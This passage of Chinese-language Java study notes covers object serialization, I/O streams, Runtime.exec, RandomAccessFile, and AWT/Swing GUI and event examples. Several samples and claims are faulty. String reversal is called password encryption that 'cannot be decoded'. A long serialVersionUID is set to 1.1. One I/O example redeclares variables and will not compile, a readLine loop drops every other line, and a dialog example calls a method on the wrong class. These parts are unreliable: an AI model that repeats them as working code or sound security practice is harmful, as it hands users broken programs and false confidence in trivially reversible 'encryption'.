2. 有时候，我们需要将这些对象通过网络进行传输。  
出于以上的目的，我们就需要对这些对象进行序列化。序列化就是将内存中的对象与二进制流之间进行相互转换以进行储存或者传输。


那么Java中可序列化对象必须具有的特征：该对象的类必须实现以下任意两个接口之一：  
`Serializable`
接口(该接口中无任何方法，只是一个标志性的接口，实现该接口无需实现任何方法)、`Externalizable`
接口(该接口使用较少）。  

用于序列化的I/O流对象：  
`ObjectInputStream`：用于从二进制流中恢复对象。 最重要的方法是`readObject()`，用于从其他储存了对象的节点中读取对象，如，从文件中读取对象。  
`ObjectOutputStream`：用于将对象转换为二进制流进行储存。最重要的方法是`writeObject(Object obj)`用于将对象储存在一个`OutputStream中`，也就是储存于一个文件节点流中,如，将对象储存于文件中。

对象序列化与对象恢复使用示例：
>
	import java.io.*;
	//the class must implements the Serializable interface that it can be serialized
	class apple implements Serializable
	{
		private String name;
		private String color;
		apple()
		{
			this.name = "zhang";
			this.color = "red";
		}
		apple(String aname,String acolor)
		{
			this.name=aname;
			this.color=acolor;
		}
		public void setname(String aname)
		{
			this.name=aname;
		}
		public void setcolor(String acolor)
		{
			this.color=acolor;
		}
		public String getname()
		{
			return this.name;
		}
		public String getcolor()
		{
			return this.color;
		}
>	
		public String toString()
		{
			String str = "apple "+this.name+" "+this.color;
			return str;
		}
	}
>
	public class appleSerializableTest
	{
		public static void main(String[] args) throws Exception
			{
				apple ap = new apple("lisi","red");
				//after the finish of the program,the ap object will perish
				System.out.println(ap);
>			
				//write the ap object into the file and save it in the disk in binary stream form with the ObjectOutputStream class
				FileOutputStream fos = new FileOutputStream("apple.bin"); 
				ObjectOutputStream ops = new ObjectOutputStream(fos); 
				ops.writeObject(ap); 
>			
				//read the object from the file stored in the disk 
				FileInputStream fis = new FileInputStream("apple.bin"); 
				ObjectInputStream ois = new ObjectInputStream(fis);
				Object bp = ois.readObject();
				apple mp = (apple)bp;
				System.out.println(mp.getname());
			}	
	}

Java中序列化的机制
-----------
1. 对于一个要被序列化的对象，其所有的属性`Field`，也就是成员变量，都必须是可序列化的，也就是实现了`Serializable`接口。  
如：`Student`类有一个属性（成员变量）`Field`是`Teacher`。那么`Student`对象如果需要被序列化，那么除了`Student`类必须实现`Serializable`接口，它的属性`Field``Teacher`类也必须实现`Serializable`接口。这样才能保证能够被序列化。  
2. 序列化底层机制：  
a. 当我们每序列化一个对象，就会给这个对象一个编号。  
b. 如果是第一次序列化一个对象，就会真的将这个对象序列化成二进制流。  
c. 如果要序列化的对象已经在之前已经序列化过一次，那么此次就只序列化一个编号，而不会再序列化保存整个对象。也就是说只会序列化保存本次编号。  

这样的序列化机制的目的是：保证磁盘中的二进制流与内存中的对象相同。  

`transient`关键字：  
只能用于修饰属于实例对象的成员`Field`(不能是`static`修饰的类`Field`变量,因为`static`变量不储存于对象中）,表示对象的这个`Field`不能被序列化储存。  
使用`transient`防止对象的某些`Field`被序列化的原因是：对象的某些`Field`如：账号、密码等敏感信息就不能被序列化储存或者传输。所以需要使用`transient`对这些关键的`Field`进行修饰。

序列化底层机制示例：
>
	import java.io.*;
	//the class must implements the Serializable interface that it can be serialized
	class Student implements Serializable
	{
		private String name;
		private Teacher teacher;
		Student()
		{
		}
		Student(String aname,Teacher ateacher)
		{
			this.name=aname;
			this.teacher=ateacher;
		}
		public void setname(String aname)
		{
			this.name=aname;
		}
		public void setteacher(Teacher ateacher)
		{
			this.teacher=ateacher;
		}
		public String getname()
		{
			return this.name;
		}
		public Teacher getteacher()
		{
			return this.teacher;
		}
>		
		public String toString()
		{
			String str = "student "+this.name+" "+this.teacher.toString();
			return str;
		}
	}
>
		class Teacher implements Serializable
		{
			private String name;
		private int age;
		Teacher()
		{
		}
		Teacher(String aname,int aage)
		{
			this.name=aname;
			this.age=aage;
		}
		public void setname(String aname)
		{
			this.name=aname;
		}
		public void setage(int aage)
		{
			this.age=aage;
		}
		public String getname()
		{
			return this.name;
		}
		public int getage()
		{
			return this.age;
		}
>		
		public String toString()
		{
			String str = "teacher "+this.name+" "+this.age;
			return str;
		}
	}
>
	public class appleSerializableTestb
	{	
		public static void main(String[] args) throws Exception
			{
				Teacher tea = new Teacher("liu",23);
				Student stu = new Student("lisi",tea);
				//after the finish of the program,the ap object will perish
				System.out.println(stu);
>			
				FileOutputStream fos = new FileOutputStream("stu.bin"); 
				ObjectOutputStream ops = new ObjectOutputStream(fos); 
				//write the stu object into the file and save it in the disk in binary stream form with the ObjectOutputStream class
				ops.writeObject(stu); 
>			
				tea.setname("hu");
				tea.setage(50);
				//do not write the tea object into the file and do not save it in the disk in binary stream form with the ObjectOutputStream class again, because this object has been serialized in the object stu that it can not been serialized again
				ops.writeObject(tea); 
>			
				FileInputStream fis = new FileInputStream("stu.bin"); 
				ObjectInputStream ois = new ObjectInputStream(fis);
				//read the stu object from the file stored in the disk 
				Object bp = ois.readObject();
				//read the tea object from the file stored in the disk 
				//but the alteration of tea can not be read because the changed object can not be serialized 
				Object cp = ois.readObject();
				Student mp = (Student)bp;
				Teacher np = (Teacher)cp;
				System.out.println(mp.getname());
				System.out.println(np.getname());
			}	
	}

**完全自定义的序列化**：  
对于账号、密码等这些敏感信息，我们如果完全通过`transient`来阻止这些`Field`被序列化是不好的(在恢复的时候就根本没有了这些信息）。这时就可以使用定制的序列化来对这些`Field`进行加密。  

如果要使用自定义的序列化，就需要让这个**要被序列化的对象的类**实现两个方法：  
`private void writeObject(ObjectOutputStream out) throws IOException`、`private void readObject(ObjectInputStream in) throws IOException` 。  
但是要注意的是：这两个方法并不是`Serializable`接口中的方法。  
这两个方法是被**系统调用**以完成对象序列化的。注意是被系统自动调用，而不是被人为调用，我们在序列化对象的时候依旧是使用`writeObject()`、`readObject()`方法的。只不过这里实现了这两个方法表示在写入和读取的时候底层是使用我们自己定制的转换方法（可以理解为加密方法）。  

**版本号**：  
由于我们的类会经常修改、变化，所以无法知道在序列化读取的时候类是不是正确的。所以要给可序列化类一个版本号。
  
实际上上如果没有给版本号，系统也会默认给一个版本号。但是默认的这个版本号不稳定。  
使用`serialver.exe`工具以查看类的版本号: `serialver.exe UseaEncodeSerializableTest`  

自定义设置类的版本号：  
在类定义的最前面加上一句：`static final long serialVersionUID = 1.1;`即将该类的版本号设置为1，以后每修改一次这个类，就可以修改一下这个类的版本号。自定义版本号后更稳定。

使用方式示例：  
>
	import java.io.*;
	//the class must implements the Serializable interface that it can be serialized
	class user implements Serializable
	{
		//set the version of the class 
		static final long serialVersionUID = 1L;
>		
		private String name;
		private String password;
		user()
		{
			this.name = "zhang";
			this.password = "red";
		}
		user(String aname,String apassword)
		{
			this.name=aname;
			this.password=apassword;
		}
		public void setname(String aname)
		{
			this.name=aname;
		}
		public void setpassword(String apassword)
		{
			this.password=apassword;
		}
		public String getname()
		{
			return this.name;
		}
		public String getpassword()
		{
			return this.password;
		}
>	
		public String toString()
		{
			String str = "user "+this.name+" "+this.password;
			return str;
		}
>	
		//set method to encode the password by yourself that it can not be get after the serialization
		private void writeObject(ObjectOutputStream out) throws IOException
		{
			out.writeUTF(this.name);
			//you can encode the Field with the method you want
			out.writeUTF(new StringBuilder(this.password).reverse().toString());
		}
		//set method to read the fields but you can not decode the password
		private void readObject(ObjectInputStream in) throws IOException
		{
			this.name = in.readUTF();
			this.password = in.readUTF();
		}
	}	
>
	public class UseaEncodeSerializableTest
	{
		public static void main(String[] args) throws Exception
			{
				user us = new user("lisi","123");
				//after the finish of the program,the ap object will perish
				System.out.println(us);
>			
				//write the us object into the file and save it in the disk in binary stream form with the ObjectOutputStream class and the Field has been encoded then it can be saved or passed through the web
				FileOutputStream fos = new FileOutputStream("user.bin"); 
				ObjectOutputStream ops = new ObjectOutputStream(fos); 
				ops.writeObject(us);
>			
				//read the object from the file stored in the disk , but can not decode the password
				FileInputStream fis = new FileInputStream("user.bin"); 
				ObjectInputStream ois = new ObjectInputStream(fis);
				Object bp = ois.readObject();
				user mp = (user)bp;
				System.out.println(mp.getpassword());
			}	
	}	
**IM**：我们使用`I/O`流类的正常使用方法：  
1. 不会直接使用节点流类。而是将它们包装成包装类进行使用。  
2. 如果联系到键盘、文件、屏幕等节点设备，那么就是节点流类。  
a. *字节节点流类*要被包装成`BufferedInputStream`、`BufferedOutputStream`这样的包装缓冲流类使用。  
b. *字符节点流类*要被包装成`BufferedReader`、`BufferedWriter`这样的包装缓冲流类来使用。  
c. 如果是*字节节点流类*要转变成*字符包装类*使用，那么就使用`InputStreamReader`、`OutputStreamWriter`这样的转换流类进行转换为'字符包装类'。  

使用方法见下例：
>
	import java.io.*;
	public class StreamReaderTest
	{
		public static void main(String[] args) throws Exception
		{
			//this part is aimed at reading the file and printing it onto the screen
			//construct args Stream class object
			FileInputStream fis= new FileInputStream("E:/Java_source/fileStreamTest.java");
>		
			//transform the stream class object(file object) into a reader class object
			InputStreamReader reader = new InputStreamReader(fis);
>
			//transform the reader class object into a Bufferedreader class object
			BufferedReader br = new BufferedReader(reader);
>
			//use the readLine() func of BufferedReader to read a line in the text
			String tempstr = null;
			while((tempstr = br.readLine())!=null)
			{
				System.out.println(tempstr);
			}
>
>
			//this part is aimed at reading the keyboard and printing it onto the screen
			//transform the stream object(System.in is the keybord) into a reader class
			InputStreamReader reader = new InputStreamReader(System.in);
>
			//transform the reader class into a Bufferedreader class
			BufferedReader br = new BufferedReader(reader);
>
			//use the readLine() func of BufferedReader to read a line in the text
			String tempstr = null;
			while((tempstr = br.readLine())!=null)
			{
				System.out.println(tempstr);
			}
		}
	}

Java中虚拟机读取其他进程数据
------------------
在`Java`中启动其他进程：  
`Runtime.getRuntime().exec()`;返回值是一个`Process`对象，就是一个进程，进程就是运行中的应用程序。  
注意：对于这个调用的进程而言，其输出的内容对于我们的`JVM`而言是输入，所以，`JVM`应该使用输入流。  

应用实例：  
>
	import java.io.*;
	public class ReadFromProcess
	{
		public static void main(String[] args) throws Exception
		{
			//create a process
			Runtime runtime = Runtime.getRuntime();
			Process proc = runtime.exec("javac.exe");
>
			//read from the process	
			InputStreamReader isr = new InputStreamReader(proc.getErrorStream()); 
			BufferedReader br = new BufferedReader(isr);
>		
			while(br.readLine()!=null)
			{
				System.out.println(br.readLine());
			}
		}	
	}

Java中的RandomAccessFile类使用
-----------------
该类可以任意访问文件，也就是说，想访问文件中的哪个点就访问哪个点。  
特征：  
1. 可以读，可以写，相当于`inputStream`、`outputStream`的合体。还可以在末尾增加。不会覆盖原有的文件内容。  
2. `RandomAccessFile`的局限性：只能访问文件。别的都不能使用。  

在构建这个对象的时候，需要制定读写模式，("r")("rw")模式。  
体现了这个类的`Random`特性的方法是`seek(long pos)`:用于将记录指针移动到任意指定的位置。默认的记录指针在文件首部。  
1. 使用`RandomAccessFile`来在文件后面追加字符：  
a. 将记录指针移动到文件末尾   
b. 执行写入。  
2. 使用`RandomAccessFile`来在文件中插入字符：  
a. 将记录指针移动到将要插入的位置   
b. 将记录指针后面的内容读取并保存  
c. 输出要插入的内容  
d. 输入已经保存的内容  

追加与插入示例：
>
	import java.io.*;
	public class RandomAccessFileTest
	{
		public static void main(String[] args) throws Exception
		{
			//random seek the position
			RandomAccessFile raf = new RandomAccessFile("good.txt","rw");
>		
			//read the file
			byte[] br =  new byte[1024];
			raf.read(br);
			String tempstr = new String(br);
			System.out.println(tempstr);
>		
			//write into the file at the end postion of the file
			raf.seek(raf.length());
			String tempstr1 = new String("hello world!");
			byte[] br2 = tempstr1.getBytes();
			raf.write(br2);
>	
			//insert into the file at the specified position
			//save the contents after the position into the ByteArrayOutputStream object
			ByteArrayOutputStream bos = new ByteArrayOutputStream();
			byte[] br3 = new byte[1024];
			raf.seek(100);
			int hasRead = -1;
			while((hasRead=raf.read(br3))!=-1)
			{
				bos.write(br3,0,hasRead);
			}
>		
			//insert the string you want into the postion
			raf.seek(100);
			String tempstr2 = new String("hello world!");
			byte[] br4 = tempstr2.getBytes();
			raf.write(br4);
>		
			//insert the contents that have been saved into the end of the file currently
			raf.seek(raf.length());
			byte[] br5 =bos.toByteArray();
			raf.write(br5);
		}	 
	}
 
Java中几个有用的类
----------
`Path`：接口。表示一个平台无关的路径。可以通过Paths工具类获得Path对象。  
传统的`File`类，既代表文件又代表路径。不好用。  
  
`Paths`：操作路径的工具类。里面有方法可以获得`Path`对象。  
`Files`：操作文件的工具类。可以直接操作文件。  
例如：要复制一个文件。不再需要使用I/O流进行复制、粘贴了。而是直接使用这个工具类即可。
`Arrays`：操作数组的工具类。  
`Collections`：操作集合的工具类。  
`Objects`：操作对象的工具类。  

`Files`类与`Paths`类使用示例：
>
	import java.nio.file.*;
	public class pathTest
	{
		public static void main(String[] args) throws Exception
		{
			//get the relative path
			Path path = Paths.get("1.java");
			Path path1 = Paths.get("4.java");
			Path path2 = Paths.get("C:/Python27/python.exe");
>			
			//get the absolute path and get the path root
			System.out.println((path.toAbsolutePath().getRoot()));  
>	
			//get the absolute path and git the path parents
			System.out.println((path.toAbsolutePath().getParent())); 
>		
			//test the file can be read
			System.out.println(Files.isReadable(path)); 
			//test the file is hidden
			System.out.println(Files.isHidden(path)); 
>		
			//copy the file in path to the file in path1
			Files.copy(path,path1,StandardCopyOption.REPLACE_EXISTING);
>		
			//test the file can be exec
			System.out.println(Files.isExecutable(path2));
		}
	}

Java中的界面编程
------------
`Java`在客户端上的表现并不突出，客户端程序主要集中在`Windows`平台上，`Java`主要集中在大型软件的服务器端编程。例如：电信、银行这些部门的软件，主要是B/S结构的，前端并不需要太复杂的实现。  

`Java`中界面组件进化历史：  
1. `AWT`(发布于JDK1.0)：一个`GUI`抽象窗口工具集，既然是抽象的，就并未为这个窗口工具集提供实现，而是调用了操作系统上的界面实现，以为了迎合操作系统的界面风格。因此AWT只能使用各个操作系统间界面组件的交集（例如：`Windows`下有按钮与图标，`linux`下有按钮与文本框，那么`AWT`中只能有按钮）所以`AWT`难以实现较好的界面。  
2. `Swing`发布，为绝大部分界面组件都提供了实现，所有的这些组件都是在黄将诶绘制在空白区域上。它自己实现了这些界面之间，所以其无需使用底层的系统组件，也就无需适配各个系统的交集。使得Swing的界面风格在各个系统中更加统一。


AWT:  
在`java.awt`包中，提供了基本的`Java`程序`GUI`设计工具：  
界面编程的本质步骤：  
1. 在创建添加界面组件之前，先创建一个容器。  
2. `new`一个界面组件。  
3. 把组件安在容器的某一个位置。

`AWT`界面组件  
界面组件设计的类结构图：如图所示。  
一切界面组件都是`Component`。  
一切的菜单组件都是`MenuComponent`。 

`Container`:容器，其本身既可以作为组件，也可以作为放置其他组件、容器的容器。
容器类对象可以使用方法`add()`来添加组件。
  
`Container`容器类的层次结构图：如图所示。  
继承Container类的有：`Window`（可独立存在）、`Panel`（不可独立存在，只能放在其他的`Container`中）、`ScrollPane`。  

继承`Window`的有`Frame`、`Dialog`。一般不直接使用`Window`而是使用`Frame`或者`Dialog`。  
`Frame`类：有标题，可通过拖拉改变大小。实际上就是代表一个窗口。

`Panel`容器：  
为放置组件提供空间。允许使用自己的布局管理器。不能单独存在，必须放置在其他的容器中。  

`AWT`中的布局管理器：  
布局管理器是一个非常有用的工具。如果不使用布局管理器，而是通过组件构造时的位置、大小来进行设置，那么会导致：  
1. 窗口大小改变的时候，窗口会变得难看。  
2. 平台改变的时候，窗口变得难以适应。

所谓的布局，就是组件位置与大小。使用布局管理器之后，更为简单，程序员无需显式控制组件的位置与大小，而是选择合适的布局管理器即可管理容器里面**各组件的位置布局**。  
布局管理器：  
1. `FlowLayout`：让组件在容器中横向排列，到顶就会自动折返到下一行。  
使用时被容器一次性调用`FlowLayout`，用于全局。  
2. `BorderLayout`：将容器分为五个区域，每个区域中都能放组件。各个区域会自动调整大小。如果某个区域没有组件，就会自动被别的区域占满。    
使用时容器一次一次为每一个组件调用`BorderLayout`的`Field`。每调用一次都只对这个组件有效果。  
但是并不表明每个区域只能放一个组件，可以使用`Panel`容器里放多个组件，然后将这个容器放在某一个区域即可。  
注意：任何一个布局管理器对象可以被任何一个容器使用，如，一个布局管理器既可以被一个`Frame`容器使用，也可以被一个`Panel`容器使用，然后可以使用这个布局管理器将这个`Panel`加到这个`Frame`容器中。  
3. `GridLayout`：将整个容器界面自定义划分成若干个块，然后对容器调用该布局管理器。即对全局的组件使用该布局管理器。   
4. `CardLayer`：将组件一个一个地叠加在一起。看到的只是最上面的那个组件。  
5. `GridBagLayout`：  
6. `BoxLayout`：是`Swing`里面的一个布局管理器。用法简单，功能强大。代替了`GridBagLayout`。要么是垂直方向排组件，要么横向排组件。   
7. 还可以不使用布局管理器：  
在`Frame`里设置布局管理器为`null`；然后对每一个组件都各自设置大小及位置。

注：内部类里访问局部变量，局部变量必须加上`Final`修饰。

`AWT`使用示例：
>	
	import java.awt.*;
	public class AWTFlowLayoutTest
	{
		public static void main(String[] args) throws Exception
		{
			FlowLayout fl = new FlowLayout(FlowLayout.CENTER,60,80);
>
			//construct a container
			Frame MainFrame = new Frame("hello");
			//set the size of the frame(container) and locate it on the postion you want
			MainFrame.setBounds(100,200,300,400);
>		
			//add the button with the default layout
			MainFrame.add(new Button("Yes"));
>
			//use the layout FlowLayout f1 for all the components
			MainFrame.setLayout(fl);
>		
			MainFrame.setVisible(true);
		}
	}

  
>
	import java.awt.*;
	public class AWTBorderLayoutTest
	{
		public static void main(String[] args) throws Exception
		{
			BorderLayout bl = new BorderLayout(10,10);
>		
			//construct a container
			Frame MainFrame = new Frame("hello");
			//set the size of the frame(container) and locate it on the postion you want
			MainFrame.setBounds(100,200,300,400);
>		
			//add new buttons with the layout b1
			MainFrame.add(new Button("East"),bl.EAST);
			MainFrame.add(new Button("West"),bl.WEST);
			MainFrame.add(new Button("North"),bl.NORTH);
			MainFrame.add(new Button("South"),bl.SOUTH); 
>		
			//create a panel with layout bl to contain two buttons
			Panel pl = new Panel(bl);
			pl.add(new Button("East"),bl.EAST);
			pl.add(new Button("West"),bl.WEST);
>
			//add the panel with layout bl
			MainFrame.add(pl,bl.CENTER);
>		
			MainFrame.setVisible(true);
		}
	}


>
	import java.awt.*;
	public class AWTGridLayoutTest
	{
		public static void main(String[] args) throws Exception
		{
			GridLayout gl = new GridLayout(2,2,5,5);
>		
			//construct a container
			Frame MainFrame = new Frame("hello");
			//set the size of the frame(container) and locate it on the postion you want
			MainFrame.setBounds(100,200,300,400);
>
			//set the layout gl
			MainFrame.setLayout(gl);
>
			//add buttons
			MainFrame.add(new Button("East"));
			MainFrame.add(new Button("West"));
			MainFrame.add(new Button("North"));
			MainFrame.add(new Button("South"));
			MainFrame.pack();
			MainFrame.setVisible(true);
		}
	}	



>
	import java.awt.*;
	public class AWTCardLayoutTest
	{
		public static void main(String[] args) throws Exception
		{
			CardLayout cl = new CardLayout(4,4);
>
			//construct a container
			Frame MainFrame = new Frame("hello");
			//set the size of the frame(container) and locate it on the postion you want
			MainFrame.setBounds(100,200,300,400);
>
			Panel pl = new Panel();
			//use the layout FlowLayout f1 for all the components
			pl.setLayout(cl);
>		
			//add the button with the default layout
			pl.add(new Button("East"));
			pl.add(new Button("West"));
			pl.add(new Button("North"));
			pl.add(new Button("South"));
>
			//cl.next(pl);
			MainFrame.add(pl,BorderLayout.NORTH);
>		
			Panel pl2 = new Panel();
			pl2.add(new Button("First"));
			pl2.add(new Button("Previous"));
			pl2.add(new Button("Next"));
			pl2.add(new Button("Last"));
>		
			MainFrame.add(pl2,BorderLayout.SOUTH);
			MainFrame.setVisible(true);
		}
	}



>
	import java.awt.*;
	import javax.swing.*;
	public class AWTBoxLayoutTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			Frame MainFrame = new Frame("hello");
			//set the size of the frame(container) and locate it on the postion you want
			MainFrame.setBounds(100,200,300,400);
>		
			//BoxLayout for MainFrame
			BoxLayout bl1 = new BoxLayout(MainFrame,BoxLayout.Y_AXIS);
			MainFrame.setLayout(bl1);
			MainFrame.add(new Button("1"));
			MainFrame.add(new Button("2"));
			MainFrame.add(new Button("3"));
>		
			Panel pl = new Panel();
			//BoxLayout for pl
			BoxLayout bl2 = new BoxLayout(pl,BoxLayout.X_AXIS);
			pl.setLayout(bl2);
			Panel pl1 = new Panel();
			//BoxLayout for pl1
			BoxLayout bl3 = new BoxLayout(pl1,BoxLayout.Y_AXIS);
			pl1.setLayout(bl3);
			pl1.add(new Button("4"));
			pl1.add(new Button("5"));
			pl.add(pl1);
			pl.add(new Button("6"));
>		
			MainFrame.add(pl);
>		
			MainFrame.setVisible(true);
		}
	}


Java中的Swing
-----------
由于`AWT`中的界面*组件*较少，所以导致界面不够美观。此时就需要使用`Swing`界面组件。  
`Java`中还有一套界面组件库，来自`IBM`的`SWT/JFaces`。
`Swing`功能更强大，使用更方便。  
`JComponent`：一切的`Swing`组件及`Swing`容器都属于（继承自）`JComponent`。`JFrame`、`JDialo`除外。  
由于`AWT`组件要调用底层系统的实现，所以被称为“重量级”组件。  
`Swing`组件是依靠自己实现，无需调用底层系统的实现，所以被称为“轻量级”组件。  

`JOptionPane`:是一个工具类，专用于弹出各种对话框。`static`方法有`showMessageDialog()`等。

`Swing`使用示例：
>
	import java.awt.*;
	import javax.swing.*;
	public class SwingTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			//MainFrame.setLayout(new FlowLayout(10,10,10));
			BorderLayout bl = new BorderLayout(40,40);
>
			//JCheckBox
			MainFrame.add(new JCheckBox("good!"),bl.NORTH);
>		
			//JColorChooser
			JColorChooser.showDialog(MainFrame, "hi", Color.black); 
>		
			//JList
			String[] str = new String[]{"1","2","3"};
			MainFrame.add(new JList<String>(str),bl.SOUTH);
>		
			//JOptionPane
			System.out.println(JOptionPane.showInputDialog(null,"please input:"));
			MainFrame.setVisible(true);
		}
	}  

`JPanel`:类似与`Panel`。  
`JPasswordField`：密码输入框。
`JProgressBar`：进度条。  
`JRadioButton`：单选框。  
`JScrollBar`：滚动条。  
`JSplitPane`：分割面板。  
`JTabledPane`：窗口里面的`Tab`页面。  
`JTable`：表格。`JTable`必须放在`JScrollPane`中显示。  
`JToggleButton`：开关按钮。
`JToolBar`：做工具条。
`JToolBar.Separator`:工具条的分割线。  
`JToolTip`：工具条上的提示。

表格使用示例：
>
	import java.awt.*;
	import javax.swing.*;
	public class SwingTableTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			//MainFrame.setLayout(new FlowLayout(10,10,10));
			BorderLayout bl = new BorderLayout(40,40);
>
			String[] str1 = new String[]{"Name","Age","Gender"};
			String[][] str2 = new String[][]{new String[]{"Jim","13","male"},new String[]{"Mary","15","female"},new String[]{"Jack","11","male"}};
>		
			JTable jt = new JTable(str2,str1);
			JScrollPane jsp = new JScrollPane(jt);
			MainFrame.add(jsp);
			MainFrame.setVisible(true);
		}
	}


工具条使用示例：
>
	import java.awt.*;
	import javax.swing.*;
	import java.awt.event.*;
	public class SwingToolBarTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			//MainFrame.setLayout(new FlowLayout(10,10,10));
			BorderLayout bl = new BorderLayout(40,40);
>
			JToolBar jtb = new JToolBar("good", JToolBar.HORIZONTAL);
			 Action ac1 = new AbstractAction("yes") 
			{
				public void actionPerformed(ActionEvent e)
				{
					System.out.println("yes");
				}
			};
			 Action ac2 = new AbstractAction("no") 
			{
				public void actionPerformed(ActionEvent e)
				{
					System.out.println("no");
				}
			};
			 Action ac3 = new AbstractAction("cancel") 
			{
				public void actionPerformed(ActionEvent e)
				{
					System.out.println("cancel");
				}
			};
			jtb.add(ac1);  
			jtb.add(ac2);  
			jtb.addSeparator(); 
			jtb.add(ac3);  
>		
		 	String[] str1 = new String[]{"Name","Age","Gender"};
			String[][] str2 = new String[][]{new String[]{"Jim","13","male"},new String[]{"Mary","15","female"},new String[]{"Jack","11","male"}};
>		
			JTable jt = new JTable(str2,str1);
			JScrollPane jsp = new JScrollPane(jt); 
			MainFrame.add(jsp);
			MainFrame.add(jtb,BorderLayout.NORTH);
			MainFrame.setVisible(true);
		}
	}


`Window`容器有两个子类：`Frame`、`Dialog`。
`Swing`中容器：`JFrame`、`JDialog`。  
`JDialog`：本质上对话框也是一个窗口，区别在于对话框必须属于某一个窗口。对话框是一个容器，里面可以放各种组件。  
创建对话框需要指定的参数：  
1.`owner`  
2. `title`  
3. 是否`modal`：如果是模式对话框，那么该对话框出现的时候，其`ower`不能得到焦点。否则就是非模式对话框。

对话框使用示例：
>
	import java.awt.*;
	import javax.swing.*;
	import java.awt.event.*;
	public class SwingDialogTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			//MainFrame.setLayout(new FlowLayout(10,10,10));
			BorderLayout bl = new BorderLayout(40,40);
>
			JButton jbu1 = new JButton("yes");
			JButton jbu2 = new JButton("no");
			JButton jbu3 = new JButton("cancel");
			MainFrame.setLayout(new FlowLayout());
			MainFrame.add(jbu1);
			MainFrame.add(jbu2);
			MainFrame.add(jbu3);
>		
			final JDialog jd1 = new JDialog(MainFrame,"yes",true);
			final JDialog jd2 = new JDialog(MainFrame,"no",false);
			final JDialog jd3 = new JDialog(MainFrame,"yes",true);
>		
			//add button action react for button1 with anonymous class
			jbu1.addActionListener(new ActionListener()
			{
				public void actionPerformed(ActionEvent e)
				{
					System.out.println("yes");
					//show the dialog
					jd1.setVisible(true);
				}
			});
>		
			//add button action react listener for button2 with anonymous class
			jbu2.addActionListener(new ActionListener()
			{
				public void actionPerformed(ActionEvent e)
				{
					System.out.println("no");
					//show the dialog
					jd2.setVisible(true);
				}
			});
>		
			//add button action react for button3 with anonymous class
			jbu3.addActionListener(new ActionListener()
			{
				public void actionPerformed(ActionEvent e)
				{
					System.out.println("cancel");
					//show the dialog
					jd3.setVisible(true);
				}
			});
>		
			MainFrame.setVisible(true);
		}
	}


还有两个特殊的对话框：
`JColorChooser`、`JFileChooser`:颜色选择对话框与文件选择对话框。

文件选择对话框使用示例：
>  
	import java.awt.*;
	import javax.swing.*;
	import java.awt.event.*;
	import java.nio.file.*;
	import java.io.*;
	public class SwingFileDialogTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			final JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			//MainFrame.setLayout(new FlowLayout(10,10,10));
			BorderLayout bl = new BorderLayout(40,40);
>
			JButton jbu3 = new JButton("Choose");
>	
			MainFrame.add(jbu3,BorderLayout.SOUTH);
>		
			//add button action react for button3
			jbu3.addActionListener(new ActionListener()
			{
				public void actionPerformed(ActionEvent e) 			{
					try
					{
						SwingDialogTest.readFile(MainFrame);
					}
					catch(Exception m)
					{
						System.out.println("Error");
					}
				}
			});
			MainFrame.setVisible(true);
		}
>	
		static void readFile(Component c) throws Exception
		{
			JFileChooser jfc = new JFileChooser();
			jfc.showOpenDialog(c);
			File f = jfc.getSelectedFile();
>		
		 	if(f!=null)
			{ 
				//read the file with notepad
				Runtime rt = Runtime.getRuntime();
				rt.exec("notepad "+f.getPath());
>		
			 	//read the line in the CMD line
				InputStreamReader isr = new InputStreamReader(new FileInputStream(f)); 
				BufferedReader br = new BufferedReader(isr);
				String tempstr = null;
				while((tempstr=br.readLine())!=null)
				{
					System.out.println(tempstr);
				}  
>		
				//read the line in the textarea
				JTextArea jtp = new JTextArea();
				JFrame jf = (JFrame)c;
				jf.add(new JScrollPane(jtp));
>	
				InputStreamReader isr1 = new InputStreamReader(new FileInputStream(f)); 
				BufferedReader br1 = new BufferedReader(isr1);
				String tempstr1 = null;
				while((tempstr1=br1.readLine())!=null)
				{
					jtp.append(tempstr1+"\n"); 
				}  
			}
		}
	}


注：怎样为一个抽象类创建对象？  
使用匿名内部类即可，使用内部类创建一个该抽象类的子类的匿名对象。然后让这个抽象类引用变量去引用这个子类的匿名对象。  

Java中的事件编程
-----------
针对的就是程序与人的交互---通过鼠标、键盘触发事件。
Java的事件处理模式：委托式的事件处理。
委托式事件处理模型：  
1. 在这种处理模型之下，事件源（如按钮）发生事件（点击）的时候，事件源不处理事件。  
2. 事件源会发出事件（`Event`）给事件监听器（`Listener`）：也就是发送了事件发生点等关于该事件的详细信息。  
3. 事件监听器（`Listener`）获得事件信息（`Event`对象），只能依据事件信息对象（`Event`）对事件进行反应处理。  
4. 事件监听器都要实现一个特定的方法。


事件源：一切组件都可能是事件源。
  
事件：无需程序员理会，事件发送过程也无需理会。
  
监听器：需要程序员实现，通过匿名内部类获得一个监听器的对象。需要实现相应的接口。  
**对于不同的事件，有不同的监听器。**需要为事件源上发生的不同的事件注册与之对应的事件监听器，也就是说一个事件源可以被多个事件监听器监听，一个事件监听器也可以监听多个事件源。  
事件编程的重点就是实现事件处理的方法。  
可以简化为匿名内部类。经常使用的是匿名内部类。
单击事件：`ActionEvent`。

下例中使用了*内部类*，还可以使用*匿名内部类*。
单击监听器： `ActionListener`
单击事件处理示例：
>
	import java.awt.*;
	import javax.swing.*;
	import java.awt.event.*;
	public class SwingActionlistenerTest
	{
		public static void main(String[] args) throws Exception
		{
			//construct a container
			JFrame MainFrame = new JFrame("hello");
			MainFrame.setBounds(100,200,300,400);
			//MainFrame.setLayout(new FlowLayout(10,10,10));
			BorderLayout bl = new BorderLayout(40,40);
>		
			//create your own actionlintener for click and implements the reaction func
			class MyEventListener implements ActionListener
			{
				public void actionPerformed(ActionEvent e) 
				{
					System.out.println(e.getActionCommand());				
					System.out.println(e.getWhen());
				}
			}
>		
			JButton bu1 = new JButton("Yes");
			JButton bu2 = new JButton("No");
			//add the actionlistener for your buttons
			bu1.addActionListener(new MyEventListener());
